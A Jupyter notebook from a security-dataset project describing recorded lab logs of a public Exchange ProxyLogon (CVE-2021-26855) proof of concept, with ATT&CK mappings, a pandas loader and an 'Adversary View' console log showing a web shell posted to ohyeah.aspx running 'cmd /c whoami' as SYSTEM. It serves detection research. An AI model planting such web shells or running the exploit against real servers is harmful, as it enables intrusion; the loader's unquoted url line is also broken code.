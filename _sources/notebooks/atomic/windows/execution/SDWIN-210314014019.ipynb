{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f6471466",
   "metadata": {},
   "source": [
    "# Exchange ProxyLogon SSRF RCE Vuln POC"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8abf2e0e",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e75298eb",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2021/03/14 |\n",
    "| Modification Date | 2021/03/14 |\n",
    "| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003),[TA0002](https://attack.mitre.org/tactics/TA0002) |\n",
    "| Techniques        | [T1505.003](https://attack.mitre.org/techniques/T1505/003) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "509eff02",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents the execution of a public POC to abuse Exchange vulnerabilities (CVE-2021-26855 server-side request forgery (SSRF) vulnerability)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c08b827",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8db3bbd6",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/proxylogon_ssrf_rce_poc.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/proxylogon_ssrf_rce_poc.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f049852",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb8f4714",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f158d5f",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | cmd | [cmd](None) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c18b56b7",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "C:\\Users\\wardog.MXS01\\Documents>\n",
    "C:\\Users\\wardog.MXS01\\Documents>python public-poc.py localhost wardog@azsentinel.local\n",
    "Attacking target localhost\n",
    "=============================\n",
    "Got DN: /o=azsentinel/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6beef80bd6d14a68b9ae39df7f27a8cc-wardog\n",
    "Got SID: S-1-5-21-594047938-393122191-2580508586-500\n",
    "Got session id: e243cd06-1093-40d4-829c-63f3b9caea9b\n",
    "Got canary: pYoEXlKOqkGQMt3Dv3qJUExebVlG6NgI3c_XeQNd-VRV8lo6E5zskoLPJB0uOOGITLTC08eVUkk.\n",
    "Got OAB id: becafe73-b0c1-4f36-8df4-85f682840ef4\n",
    "Ready!\n",
    "\n",
    "Testing command:\n",
    "===============\n",
    "POST  shell:https://localhost/owa/auth/ohyeah.aspx\n",
    "code\":\"Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"cmd /c whoami\").StdOut.ReadAll());\n",
    "\n",
    "\n",
    "[*] Waiting for ohyeah.aspx to be available..\n",
    "[*] Waiting for ohyeah.aspx to be available..\n",
    "\n",
    "Results:\n",
    "========\n",
    "nt authority\\system\n",
    "\n",
    "\n",
    "C:\\Users\\wardog.MXS01\\Documents>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b565a0dd",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "073a0780",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6257c70",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/proxylogon_ssrf_rce_poc.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "28ac8af0",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26c1291f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "29696c0b",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8fafb725",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "359ade37",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) \n",
    "* [https://twitter.com/jack_halon/status/1370192318377168897](https://twitter.com/jack_halon/status/1370192318377168897) \n",
    "* [https://github.com/OTRF/Azure-Sentinel2Go/tree/master/grocery-list/Win10-AD-MXS](https://github.com/OTRF/Azure-Sentinel2Go/tree/master/grocery-list/Win10-AD-MXS) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
